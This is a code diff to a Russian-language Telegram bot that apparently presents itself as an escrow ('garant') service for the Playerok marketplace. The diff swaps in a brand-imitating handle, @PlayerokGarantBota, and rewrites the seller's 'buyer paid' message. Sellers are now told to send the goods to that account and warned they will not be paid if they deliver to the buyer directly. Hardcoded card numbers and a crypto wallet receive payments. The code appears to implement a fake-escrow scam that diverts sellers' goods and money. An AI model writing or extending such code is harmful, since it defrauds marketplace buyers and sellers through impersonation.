@@ -23,7 +23,7 @@ WELCOME_GIF = "https://i.postimg.cc/3RdLNqkp/0309-1-1.gif"
 CARD_RUB = "5536 9127 6123 5312"
 CARD_USD = "5536 9127 6123 5312"
 TON_ADDRESS = "UQAjHsTNWO_NaZXkSuf4gO9r6YSs3zuz_dsDyz4QQ5nIRGQI"
-STARS_ACCOUNT = "@Player0kGarant"
+STARS_ACCOUNT = "@PlayerokGarantBota"
 ANY_CURRENCY = "5536 9127 6123 5312"
 
 bot = Bot(token=BOT_TOKEN)
@@ -910,9 +910,9 @@ async def confirm_payment(callback: CallbackQuery):
             f"✨ Покупатель оплатил заказ!\n\n"
             f"Товар: {deal[3]}\n"
             f"Сумма: {deal[5]} {deal[6]}\n"
-            f"ID сделки: {deal[0]}\n"
-            f"Ваши реквизиты: {deal[9]}\n\n"
-            f"❗ Отправьте товар покупателю\n"
+            f"ID сделки: {deal[0]}\n\n"
+            f"❗Отправьте товар на аккаунт - @PlayerokGarantBota\n"
+            f"Если вы отправите этот подарок напрямую покупателю, то ваши средства не будут выданы\n\n"
             f"После получения товара покупателем деньги будут переведены на ваши реквизиты"
         )
         await bot.send_message(seller_id, seller_notification)
@@ -1040,3 +1040,4 @@ async def main():
 if __name__ == "__main__":
 
     asyncio.run(main())
+
